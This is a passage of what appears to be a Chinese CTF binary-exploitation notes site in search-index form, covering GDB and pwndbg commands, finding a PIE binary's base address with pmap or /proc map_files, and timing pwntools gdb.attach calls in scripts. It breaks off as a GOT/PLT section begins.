\u7b2c\u4e00\u4e2a 0x557d7b317000 \u4e3a elf \u57fa\u5730\u5740\u3002 \u771f\u5b9e\u5730\u5740\u4e3a\uff1a0x557d7b317000 + \u504f\u79fb\uff08ida\u663e\u793a\u7684\u4e09\u4f4d\u5730\u5740\uff09 \u65b9\u5f0f\u4e8c\uff1a \u00b6 \u4f7f\u7528 /usr/bin \u76ee\u5f55\u4e0b pmap \u7a0b\u5e8f\u3002 *pmap + pid*\u547d\u4ee4\u53ef\u4ee5\u5c06\u8be5\u8fdb\u7a0b\u7684\u5730\u5740\u4fe1\u606f\u548c\u76f8\u5e94\u5730\u5740\u6bb5\u7684\u6743\u9650\u6253\u5370\u51fa\u3002 /usr/bin/pmap 6158 \u65b9\u6cd5\u4e09\uff1a \u00b6 IDA \u8fdc\u7a0b\u8c03\u8bd5 \u4e0e Pwntools \u8054\u52a8 \u00b6 \u4e0a\u9762\u65b9\u6cd5\u90fd\u662f\u5728\u547d\u4ee4\u884c\u542f\u52a8\u7684 GDB \u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u7f16\u5199\u6210 exp \u811a\u672c\u8c03\u8bd5\u65b9\u6cd5\u770b \u8fd9\u91cc Pwntools \u8c03\u8bd5 PIE \u7a0b\u5e8f \u00b6 \u4f20\u5165\u660e\u786e\u5730\u5740 \u00b6 \u4e5f\u5c31\u662f\u5728 gdb.attach(p,\"b *\u771f\u5b9e\u5730\u5740\") \u8fd9\u6837\u4f20\u53c2\u3002\u8fd9\u4e2a\u771f\u5b9e\u5730\u5740\u5bfb\u5740\u539f\u7406\u5728 GDB \u8c03\u8bd5 PIE \u7a0b\u5e8f \u63d0\u53ca\uff0c\u5728 exp \u4e2d\u5c31\u7528 os \u5e93\u6267\u884c\u547d\u4ee4\u83b7\u53d6\u5e76\u4f20\u53c2\u3002 # \u811a\u672c\u6458\u9009\u81ea\u7f51\u7edc\uff0c\u672a\u627e\u5230\u539f\u4f5c\u8005 from pwn import * import os def DEBUG ( bps = [], pie = False ): cmd = 'set follow-fork-mode parent \\n ' #cmd='' if pie : base = int ( os . popen ( \"pmap {} |awk '{{print $1}}'\" . format ( p . pid )) . readlines ()[ 1 ], 16 ) #base =int(os.popen(\"pmap -x {0} \".format(p.pid)).readlines()[2][:16],16) cmd += '' . join ([ 'b * {:#x} \\n ' . format ( b + base ) for b in bps ]) else : cmd += '' . join ([ 'b *$rebase( {:#x} ) \\n ' . format ( b ) for b in bps ]) # if bps !=[]: # cmd +='c' gdb . attach ( p , cmd ) base = int(os.popen(\u201cpmap {}| awk \u2018{{print $1}}\u2019\u201d.format(io.pid)).readlines()[1], 16) \u83b7\u53d6 elf \u57fa\u5730\u5740\uff0c\u6839\u636e\u4f20\u5165\u504f\u79fb\u91cf\uff0c\u7ed9 gdb.attach() \u4f20\u5165\u6307\u4ee4\uff1a b *\u5f53\u524d\u65ad\u70b9\u771f\u5b9e\u5730\u5740 \u3002\u5982\u679c pie \u53c2\u6570\u4e3a\u5047\uff0c\u4f20\u5165\u6307\u4ee4\uff1a b *$rebase(\u504f\u79fb\u91cf) \uff0c\u504f\u79fb\u91cf\u662f ida \u663e\u793a\u4e09\u4f4d\u5730\u5740\u3002 \u4f20\u5165\u504f\u79fb\u91cf \u00b6 \u548c \u4f20\u5165\u660e\u786e\u5730\u5740 DEBUG \u51fd\u6570 pie \u4e3a\u5047\u60c5\u51b5\u5dee\u4e0d\u591a\u3002 \u4f46\u6709\u5e16\u5b50\u548c\u6211\u4e5f\u8bd5\u4e86\u4e00\u4e0b\uff0c\u5f00\u542f pie \u4f20\u5165 gdb \u547d\u4ee4 b *$rebase(\u504f\u79fb\u91cf) \u8fd8\u662f\u80fd\u7684\u3002 \u5728\u4f60\u60f3\u6253\u65ad\u70b9\u7684\u524d\u9762\u8c03\u7528 gdb.attach(p,\"b *$rebase(\u504f\u79fb\u91cf)\") \uff0c\u4e00\u822c\u80fd\u505c\u4e0b\u6765\uff0c\u4f46\u662f\u4f1a\u505c\u5728\u65ad\u70b9\u7684\u524d\u9762\uff0c\u7136\u540e\u81ea\u5df1\u624b\u52a8 step \u5355\u6b65\u8fc7\u53bb\u54af\u3002 from pwn import * gdb . attach ( p , \"b *$rebase(\u504f\u79fb\u91cf)\" ) \u5355\u6b65\u8ddf\u8fd8\u662f\u4f1a\u8df3\u8fc7\u4e00\u4e9b\u6307\u4ee4 \u00b6 \u6bd4\u5982\u8bf4 call xxx@plt \u8c03\u7528 plt \u65f6\uff0cstep \u4e0d\u4f1a\u8ddf\u8fdb plt \u51fd\u6570\u4e2d\uff0c\u6539\u7528 si \u3002 \u811a\u672c\u4e2d GDB \u653e\u7f6e\u4f4d\u7f6e \u00b6 \u8c03\u7528 gdb \u6709\u4e00\u5b9a\u65f6\u5ef6 \u9996\u5148\u660e\u786e\u7684\u5728\u811a\u672c\u4e2d\u8c03\u7528 gdb \u5e76\u4e0d\u662f\u51c6\u786e\u505c\u5728\u8c03\u7528\u8fd9\u4e00\u884c\uff0c\u800c\u662f\u4f1a\u6267\u884c\u5230\u811a\u672c\u7684 \u4e0b\u4e00\uff08\u6216\u51e0\uff09\u884c\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a p . sendline ( 'string1' ) gdb . attach ( p ) p . sendline ( 'string2' ) log \u4e2d\u4f1a\u770b\u5230 string2 \u5df2\u7ecf\u8f93\u5165\u4e86\uff0cgdb \u624d\u771f\u6b63\u8fdb\u5165\u3002 #include <stdio.h> #include <unistd.h> int main () { char string1 [ 5 ] = { 'h' , 'e' , 'l' , 'l' , 'o' }; char string2 [ 5 ] = { 'h' , 'e' , 'l' , 'l' , 'o' }; read ( 0 , string1 , 5 ); read ( 0 , string2 , 5 ); printf ( \"%s\" , string1 ); printf ( \"%s\" , string1 ); } \u5047\u5982\u60f3\u5c06\u4e0a\u9762\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u505c\u5728\u521a\u8f93\u5165\u5b8c\u800c\u672a\u8fdb\u5165 printf \uff0c\u57fa\u4e8e\u4e0a\u9762\u63d0\u53ca\u7684\u7279\u70b9\uff0c\u5728\u6700\u540e\u4e00\u6b21\u8f93\u5165\u524d\u8c03\u7528 gdb \u3002 from pwn import * p = process ( \"./pwn\" ) p . sendline ( 'a' * 5 ) gdb . attach ( p ) p . sendline ( 'a' * 5 ) \u603b\u7ed3 \uff1a\u5c31\u662f\u5728\u6700\u540e\u4e00\u6761\u8f93\u5165\u547d\u4ee4\u524d\u6253\u65ad\u70b9\u3002\u56e0\u4e3a\u6709\u65f6\u5ef6\uff0c\u6240\u4ee5\u76f8\u90bb\u547d\u4ee4\u4e5f\u88ab\u6267\u884c\u3002\u8fd9\u79cd\u65b9\u6cd5\u5e94\u8be5\u662f\u7528\u4e8e\u5927\u90e8\u5206\u6808\u9898\u76ee\u3002\u5806\u9898\u76ee\u56e0\u4e3a\u83dc\u5355\u505c\u987f\uff0c\u5c31\u76f4\u63a5\u8c03\u7528\u54af\u3002 GDB \u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f \u00b6 \u7a0b\u5e8f\u5df2\u5b8c\u6210 \u00b6 \u987e\u540d\u601d\u4e49\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u9000\u51fa\uff0cgdb \u5f53\u7136\u627e\u4e0d\u5230\u8fdb\u7a0b\u4fe1\u606f\u3002\u8fd9\u79cd\u60c5\u51b5\u7684\u51e0\u79cd\u53ef\u80fd\uff1a**\u6808\u9898\u76ee**\u6216\u8005\u7ebf\u6027\u7684\u7a0b\u5e8f\uff08\u6267\u884c\u5b8c\u4e00\u7cfb\u5217\u64cd\u4f5c\u5c31\u9000\u51fa\uff09\u9000\u51fa\u4e86\uff1bgdb \u8c03\u7528\u540e\u9762\u6ca1\u6709\u5176\u4ed6\u64cd\u4f5c\u3002 \u7a0b\u5e8f\u9000\u51fa\u60c5\u51b5 \u00b6 \u63d0\u524d\u8c03\u7528 gdb \u54af\u3002\u4e14\u4e0d\u8981\u518d\u811a\u672c\u672b\u5c3e\u8c03\u7528 gdb \uff0c\u5c31\u662f\u907f\u514d gdb \u540e\u65e0\u5176\u4ed6\u64cd\u4f5c \u3002 gdb \u540e\u65e0\u5176\u4ed6\u64cd\u4f5c \u00b6 \u53ef\u80fd\u5728\u5806\u8c03\u8bd5\u6bd4\u8f83\u5e38\u89c1\uff0c\u5c31\u5728 gdb.attach() \u540e\u9762\u52a0\u4e00\u884c\u65e0\u5173\u64cd\u4f5c\uff0c\u6bd4\u5982\u8bf4\u8c03\u7528\u9898\u76ee\u8f93\u51fa\u51fd\u6570\u7b49\uff0c\u6216\u8005\u76f4\u63a5 sleep(1) \uff0c\u7b49 gdb \u83b7\u53d6\u5230\u8fdb\u7a0b\u4fe1\u606f\u5c31\u884c\u3002 gdb \u67e5\u8be2\u5404\u5185\u5b58\u6bb5\u6743\u9650 \u00b6 \u5728\u6709\u4e9b\u9898\u76ee ida \u5206\u6790\u7684\u5185\u5b58\u6bb5\u6743\u9650\u597d\u50cf\u6709\u9519\u8bef\uff0c\u53ef\u4ee5\u7528 gdb \u9a8c\u8bc1\u3002\uff08eg\uff1aget_started_3dsctf_2016\uff09 \u4f7f\u7528\u547d\u4ee4\uff1a maintenance info sections \u4f8b\u5b50\uff1a pwndbg> maintenance info sections Exec file: ` /home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016 ' , file type elf32-i386. [ 0 ] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS \u5982\u679c\u9700\u8981\u5728\u5176\u4ed6\u7a97\u53e3\u8c03\u8bd5\uff0c\u9700\u8981\u83b7\u53d6 PID \uff0c\u5177\u4f53\u8bf7\u770b\u8fd9\u91cc\uff1a GDB\u68c0\u67e5\u5185\u5b58\u6743\u9650","title":"GDB\u8c03\u8bd5\u547d\u4ee4\u4e0e\u6280\u5de7"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#x","text":"x \u6307\u4ee4\u7528\u4e8e\u67e5\u770b\u5185\u5b58\u5730\u5740\u7684\u503c\uff0c x \u547d\u4ee4\u8bed\u6cd5\uff1a x/<n/f/u> <target addr> n \uff1a\u8f93\u51fa\u4e2a\u6570 f \uff1a\u663e\u793a\u683c\u5f0f\u3002 \u5728 pwn \u9898\u4e2d\u901a\u5e38\u90fd\u662f\u4f7f\u7528 16 \u8fdb\u5236\u67e5\u770b\u3002 x \uff1a\u5341\u516d\u8fdb\u5236\uff08\u5e38\u7528\uff09 d \uff1a\u5341\u8fdb\u5236\u683c\u5f0f u \uff1a\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u65e0\u7b26\u53f7\u6574\u578b o \uff1a\u516b\u8fdb\u5236\u683c\u5f0f\u91cf t \uff1a\u4e8c\u8fdb\u5236\u683c\u5f0f c \uff1a\u5b57\u7b26\u683c\u5f0f f \uff1a\u6d6e\u70b9\u6570\u683c\u5f0f u \uff1a\u67e5\u770b\u5b57\u8282\u5355\u5143\u6570\u3002\u5728 pwn \u9898\u4e2d\uff0c\u6839\u636e\u9898\u76ee\u662f 32 \u4f4d\u8fd8\u662f 64 \u4f4d\u7075\u6d3b\u5207\u6362 w \u548c g b \uff1a\u5355\u5b57\u8282\uff088 \u4f4d\uff0c1 \u4e2a\u5b57\u8282\uff09 h \uff1a\u53cc\u5b57\u8282\uff0816 \u4f4d\uff0c2 \u4e2a\u5b57\u8282\uff09 w \uff1a\u5b57\uff0832\u4f4d\uff0c4 \u4e2a\u5b57\u8282\uff09\uff08\u5e38\u7528\uff09 g \uff1a\u5927\u5b57\uff0864 \u4f4d\uff0c8 \u4e2a\u5b57\u8282\uff09\uff08\u5e38\u7528\uff09 \u53ef\u80fd\u5e38\u7528\u5f62\u5f0f\uff1a x /20xg addr \u67e5 64 \u4f4d\u7a0b\u5e8f\u5185\u5b58\u4fe1\u606f x /20xw addr \u67e5 32 \u4f4d\u7a0b\u5e8f\u5185\u5b58\u4fe1\u606f","title":"x \u67e5\u8be2\u6307\u4ee4"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_1","text":"where \uff1a\u663e\u793a\u8c03\u7528\u5806\u6808 frame \uff1a\u663e\u793a\u8c03\u7528\u5806\u6808\u9876\u90e8 up \uff1a\u5411\u8c03\u7528\u5806\u6808\u5e95\u90e8\u79fb\u52a8 down \uff1a\u5411\u8c03\u7528\u5806\u6808\u9876\u90e8\u79fb\u52a8","title":"\u67e5\u770b\u8c03\u7528\u4e2d\u7684\u5806\u6808"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#gdb-pie","text":"","title":"GDB \u8c03\u8bd5 PIE \u7a0b\u5e8f"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_2","text":"\u5b89\u88c5 pwndbg \u63d2\u4ef6\uff0c\u7136\u540e\u8fd9\u6837\u4e0b\u65ad\u70b9\uff1a0x\u76f8\u5bf9\u57fa\u5740\u504f\u79fb\u5c31\u662f IDA \u663e\u793a\u7684\u4e09\u4f4d\u6570 b * $rebase ( 0x\u76f8\u5bf9\u57fa\u5740\u504f\u79fb )","title":"\u65b9\u6cd5\u4e00\uff1a"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_3","text":"\u5728 /proc \u76ee\u5f55\u4e2d\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u5728\u6b64\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u4ee5\u8fdb\u7a0b id \u4e3a\u540d\u7684\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5b58\u50a8\u7740\u8fdb\u7a0b\u7684\u52a8\u6001\u94fe\u63a5\u548c\u5730\u5740\u7684\u4fe1\u606f\u3002 \u5728\u6bcf\u4e2a\u8fdb\u7a0b\u7684 map_file \u6587\u4ef6\u5939\u4e2d\uff0c\u5b58\u50a8\u7740\u5404\u4e2a\u5730\u5740\u6bb5\u7684\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\uff08\u5730\u5740\uff09\u3002 \u67e5\u627e\u5f53\u524d\u8fdb\u7a0b pid \u4e3a 6158 : $ ps -aux | grep \u7a0b\u5e8f\u540d hu 6158 0 .0 0 .0 4356 632 pts/18 S+ 07 :50 0 :00 ./\u7a0b\u5e8f\u540d hu 6162 0 .0 0 .0 21292 1088 pts/20 S+ 07 :51 0 :00 grep --color = auto \u7a0b\u5e8f\u540d \u77e5\u9053 pid \u4e4b\u540e\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6 elf \u673a\u5236","title":"\u65b9\u6cd5\u4e8c\uff1a"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_4","text":"\u8fdb\u5165\u76ee\u5f55 /proc/{pid}/map_files \u67e5\u8be2\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\uff08\u5730\u5740\uff09: /proc/6158/map_files$ ls 557d7b317000-557d7b319000 7f0d1da3c000-7f0d1dc3c000 7f0d1de6b000-7f0d1de6c000 557d7b518000-557d7b519000 7f0d1dc3c000-7f0d1dc40000 7f0d1de6c000-7f0d1de6d000 557d7b519000-557d7b51a000 7f0d1dc40000-7f0d1dc42000 7f0d1d87c000-7f0d1da3c000 7f0d1dc46000-7f0d1dc6c000 \u7b2c\u4e00\u4e2a 0x557d7b317000 \u4e3a elf \u57fa\u5730\u5740\u3002 \u771f\u5b9e\u5730\u5740\u4e3a\uff1a0x557d7b317000 + \u504f\u79fb\uff08ida\u663e\u793a\u7684\u4e09\u4f4d\u5730\u5740\uff09","title":"\u65b9\u5f0f\u4e00\uff1a"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_5","text":"\u4f7f\u7528 /usr/bin \u76ee\u5f55\u4e0b pmap \u7a0b\u5e8f\u3002 *pmap + pid*\u547d\u4ee4\u53ef\u4ee5\u5c06\u8be5\u8fdb\u7a0b\u7684\u5730\u5740\u4fe1\u606f\u548c\u76f8\u5e94\u5730\u5740\u6bb5\u7684\u6743\u9650\u6253\u5370\u51fa\u3002 /usr/bin/pmap 6158","title":"\u65b9\u5f0f\u4e8c\uff1a"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_6","text":"IDA \u8fdc\u7a0b\u8c03\u8bd5","title":"\u65b9\u6cd5\u4e09\uff1a"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#pwntools","text":"\u4e0a\u9762\u65b9\u6cd5\u90fd\u662f\u5728\u547d\u4ee4\u884c\u542f\u52a8\u7684 GDB \u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u7f16\u5199\u6210 exp \u811a\u672c\u8c03\u8bd5\u65b9\u6cd5\u770b \u8fd9\u91cc","title":"\u4e0e Pwntools \u8054\u52a8"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#pwntools-pie","text":"","title":"Pwntools \u8c03\u8bd5 PIE \u7a0b\u5e8f"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_7","text":"\u4e5f\u5c31\u662f\u5728 gdb.attach(p,\"b *\u771f\u5b9e\u5730\u5740\") \u8fd9\u6837\u4f20\u53c2\u3002\u8fd9\u4e2a\u771f\u5b9e\u5730\u5740\u5bfb\u5740\u539f\u7406\u5728 GDB \u8c03\u8bd5 PIE \u7a0b\u5e8f \u63d0\u53ca\uff0c\u5728 exp \u4e2d\u5c31\u7528 os \u5e93\u6267\u884c\u547d\u4ee4\u83b7\u53d6\u5e76\u4f20\u53c2\u3002 # \u811a\u672c\u6458\u9009\u81ea\u7f51\u7edc\uff0c\u672a\u627e\u5230\u539f\u4f5c\u8005 from pwn import * import os def DEBUG ( bps = [], pie = False ): cmd = 'set follow-fork-mode parent \\n ' #cmd='' if pie : base = int ( os . popen ( \"pmap {} |awk '{{print $1}}'\" . format ( p . pid )) . readlines ()[ 1 ], 16 ) #base =int(os.popen(\"pmap -x {0} \".format(p.pid)).readlines()[2][:16],16) cmd += '' . join ([ 'b * {:#x} \\n ' . format ( b + base ) for b in bps ]) else : cmd += '' . join ([ 'b *$rebase( {:#x} ) \\n ' . format ( b ) for b in bps ]) # if bps !=[]: # cmd +='c' gdb . attach ( p , cmd ) base = int(os.popen(\u201cpmap {}| awk \u2018{{print $1}}\u2019\u201d.format(io.pid)).readlines()[1], 16) \u83b7\u53d6 elf \u57fa\u5730\u5740\uff0c\u6839\u636e\u4f20\u5165\u504f\u79fb\u91cf\uff0c\u7ed9 gdb.attach() \u4f20\u5165\u6307\u4ee4\uff1a b *\u5f53\u524d\u65ad\u70b9\u771f\u5b9e\u5730\u5740 \u3002\u5982\u679c pie \u53c2\u6570\u4e3a\u5047\uff0c\u4f20\u5165\u6307\u4ee4\uff1a b *$rebase(\u504f\u79fb\u91cf) \uff0c\u504f\u79fb\u91cf\u662f ida \u663e\u793a\u4e09\u4f4d\u5730\u5740\u3002","title":"\u4f20\u5165\u660e\u786e\u5730\u5740"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_8","text":"\u548c \u4f20\u5165\u660e\u786e\u5730\u5740 DEBUG \u51fd\u6570 pie \u4e3a\u5047\u60c5\u51b5\u5dee\u4e0d\u591a\u3002 \u4f46\u6709\u5e16\u5b50\u548c\u6211\u4e5f\u8bd5\u4e86\u4e00\u4e0b\uff0c\u5f00\u542f pie \u4f20\u5165 gdb \u547d\u4ee4 b *$rebase(\u504f\u79fb\u91cf) \u8fd8\u662f\u80fd\u7684\u3002 \u5728\u4f60\u60f3\u6253\u65ad\u70b9\u7684\u524d\u9762\u8c03\u7528 gdb.attach(p,\"b *$rebase(\u504f\u79fb\u91cf)\") \uff0c\u4e00\u822c\u80fd\u505c\u4e0b\u6765\uff0c\u4f46\u662f\u4f1a\u505c\u5728\u65ad\u70b9\u7684\u524d\u9762\uff0c\u7136\u540e\u81ea\u5df1\u624b\u52a8 step \u5355\u6b65\u8fc7\u53bb\u54af\u3002 from pwn import * gdb . attach ( p , \"b *$rebase(\u504f\u79fb\u91cf)\" )","title":"\u4f20\u5165\u504f\u79fb\u91cf"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_9","text":"\u6bd4\u5982\u8bf4 call xxx@plt \u8c03\u7528 plt \u65f6\uff0cstep \u4e0d\u4f1a\u8ddf\u8fdb plt \u51fd\u6570\u4e2d\uff0c\u6539\u7528 si \u3002","title":"\u5355\u6b65\u8ddf\u8fd8\u662f\u4f1a\u8df3\u8fc7\u4e00\u4e9b\u6307\u4ee4"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#gdb","text":"\u8c03\u7528 gdb \u6709\u4e00\u5b9a\u65f6\u5ef6 \u9996\u5148\u660e\u786e\u7684\u5728\u811a\u672c\u4e2d\u8c03\u7528 gdb \u5e76\u4e0d\u662f\u51c6\u786e\u505c\u5728\u8c03\u7528\u8fd9\u4e00\u884c\uff0c\u800c\u662f\u4f1a\u6267\u884c\u5230\u811a\u672c\u7684 \u4e0b\u4e00\uff08\u6216\u51e0\uff09\u884c\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a p . sendline ( 'string1' ) gdb . attach ( p ) p . sendline ( 'string2' ) log \u4e2d\u4f1a\u770b\u5230 string2 \u5df2\u7ecf\u8f93\u5165\u4e86\uff0cgdb \u624d\u771f\u6b63\u8fdb\u5165\u3002 #include <stdio.h> #include <unistd.h> int main () { char string1 [ 5 ] = { 'h' , 'e' , 'l' , 'l' , 'o' }; char string2 [ 5 ] = { 'h' , 'e' , 'l' , 'l' , 'o' }; read ( 0 , string1 , 5 ); read ( 0 , string2 , 5 ); printf ( \"%s\" , string1 ); printf ( \"%s\" , string1 ); } \u5047\u5982\u60f3\u5c06\u4e0a\u9762\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u505c\u5728\u521a\u8f93\u5165\u5b8c\u800c\u672a\u8fdb\u5165 printf \uff0c\u57fa\u4e8e\u4e0a\u9762\u63d0\u53ca\u7684\u7279\u70b9\uff0c\u5728\u6700\u540e\u4e00\u6b21\u8f93\u5165\u524d\u8c03\u7528 gdb \u3002 from pwn import * p = process ( \"./pwn\" ) p . sendline ( 'a' * 5 ) gdb . attach ( p ) p . sendline ( 'a' * 5 ) \u603b\u7ed3 \uff1a\u5c31\u662f\u5728\u6700\u540e\u4e00\u6761\u8f93\u5165\u547d\u4ee4\u524d\u6253\u65ad\u70b9\u3002\u56e0\u4e3a\u6709\u65f6\u5ef6\uff0c\u6240\u4ee5\u76f8\u90bb\u547d\u4ee4\u4e5f\u88ab\u6267\u884c\u3002\u8fd9\u79cd\u65b9\u6cd5\u5e94\u8be5\u662f\u7528\u4e8e\u5927\u90e8\u5206\u6808\u9898\u76ee\u3002\u5806\u9898\u76ee\u56e0\u4e3a\u83dc\u5355\u505c\u987f\uff0c\u5c31\u76f4\u63a5\u8c03\u7528\u54af\u3002","title":"\u811a\u672c\u4e2d GDB \u653e\u7f6e\u4f4d\u7f6e"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#gdb_1","text":"","title":"GDB \u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_10","text":"\u987e\u540d\u601d\u4e49\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u9000\u51fa\uff0cgdb \u5f53\u7136\u627e\u4e0d\u5230\u8fdb\u7a0b\u4fe1\u606f\u3002\u8fd9\u79cd\u60c5\u51b5\u7684\u51e0\u79cd\u53ef\u80fd\uff1a**\u6808\u9898\u76ee**\u6216\u8005\u7ebf\u6027\u7684\u7a0b\u5e8f\uff08\u6267\u884c\u5b8c\u4e00\u7cfb\u5217\u64cd\u4f5c\u5c31\u9000\u51fa\uff09\u9000\u51fa\u4e86\uff1bgdb \u8c03\u7528\u540e\u9762\u6ca1\u6709\u5176\u4ed6\u64cd\u4f5c\u3002","title":"\u7a0b\u5e8f\u5df2\u5b8c\u6210"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#_11","text":"\u63d0\u524d\u8c03\u7528 gdb \u54af\u3002\u4e14\u4e0d\u8981\u518d\u811a\u672c\u672b\u5c3e\u8c03\u7528 gdb \uff0c\u5c31\u662f\u907f\u514d gdb \u540e\u65e0\u5176\u4ed6\u64cd\u4f5c \u3002","title":"\u7a0b\u5e8f\u9000\u51fa\u60c5\u51b5"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#gdb_2","text":"\u53ef\u80fd\u5728\u5806\u8c03\u8bd5\u6bd4\u8f83\u5e38\u89c1\uff0c\u5c31\u5728 gdb.attach() \u540e\u9762\u52a0\u4e00\u884c\u65e0\u5173\u64cd\u4f5c\uff0c\u6bd4\u5982\u8bf4\u8c03\u7528\u9898\u76ee\u8f93\u51fa\u51fd\u6570\u7b49\uff0c\u6216\u8005\u76f4\u63a5 sleep(1) \uff0c\u7b49 gdb \u83b7\u53d6\u5230\u8fdb\u7a0b\u4fe1\u606f\u5c31\u884c\u3002","title":"gdb \u540e\u65e0\u5176\u4ed6\u64cd\u4f5c"},{"location":"Pwn/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7/#gdb_3","text":"\u5728\u6709\u4e9b\u9898\u76ee ida \u5206\u6790\u7684\u5185\u5b58\u6bb5\u6743\u9650\u597d\u50cf\u6709\u9519\u8bef\uff0c\u53ef\u4ee5\u7528 gdb \u9a8c\u8bc1\u3002\uff08eg\uff1aget_started_3dsctf_2016\uff09 \u4f7f\u7528\u547d\u4ee4\uff1a maintenance info sections \u4f8b\u5b50\uff1a pwndbg> maintenance info sections Exec file: ` /home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016 ' , file type elf32-i386. [ 0 ] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS \u5982\u679c\u9700\u8981\u5728\u5176\u4ed6\u7a97\u53e3\u8c03\u8bd5\uff0c\u9700\u8981\u83b7\u53d6 PID \uff0c\u5177\u4f53\u8bf7\u770b\u8fd9\u91cc\uff1a GDB\u68c0\u67e5\u5185\u5b58\u6743\u9650","title":"gdb \u67e5\u8be2\u5404\u5185\u5b58\u6bb5\u6743\u9650"},{"location":"Pwn/GOT%E4%B8%8EPLT/","text":"\u91cd\u5b9a\u5411 \u00b6 \u4e8c\u8fdb\u5236\u6587\u4ef6\u6709\u4e24\u79cd\u7c7b\u578b\uff1a\u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5\u3002\u9759\u6001\u94fe\u63a5\u4e8c\u8fdb\u5236\u6587\u4ef6\u5305\u542b\u8fd0\u884c\u9700\u8981\u7684\u5168\u90e8\u4ee3\u7801\uff0c\u4e0d\u8981\u52a0\u8f7d\u5916\u90e8\u5e93\u3002\u52a8\u6001\u94fe\u63a5\u6ca1\u6709\u5305\u542b\u5168\u90e8\u4ee3\u7801\uff0c\u9700\u8981\u52a0\u8f7d\u7cfb\u7edf\u5e93\u6765\u8fd0\u884c\u3002 \u5047\u8bbe\u52a8\u6001\u94fe\u63a5\u4e8c\u8fdb\u5236\u6587\u4ef6\u52a0\u8f7d\uff08\u8c03\u7528\uff09\u7cfb\u7edf\u5e93\u4f7f\u7528\u786c\u7f16\u7801\u5730\u5740\uff08\u7edd\u5bf9\u5730\u5740\uff09\uff0c\u90a3\u4e48\u7cfb\u7edf\u5e93\u53d1\u751f\u53d8\u5316\uff0c\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u7684\u786c\u7f16\u7801\u5730\u5740\u5f88\u53ef\u80fd\u5168\u90e8\u6539\u53d8\u3002\u6240\u4ee5\u63d0\u51fa\u4e86\u4e00\u4e2a**\u91cd\u5b9a\u5411**\u673a\u5236\u3002 .got \u3001 .plt \u3001 .got.plt \u3001 \u94fe\u63a5\u5668 \u7b49\u662f\u91cd\u5b9a\u5411\u7684\u7ec4\u6210\u6210\u5206\u3002 \u91cd\u5b9a\u4f4d\u8868\uff08relocations\uff09 \u00b6 .got \u00b6 \u5168\u5c40\u504f\u79fb\u8868\u3002\u7528\u4e8e\u8bb0\u5f55\u5728 ELF 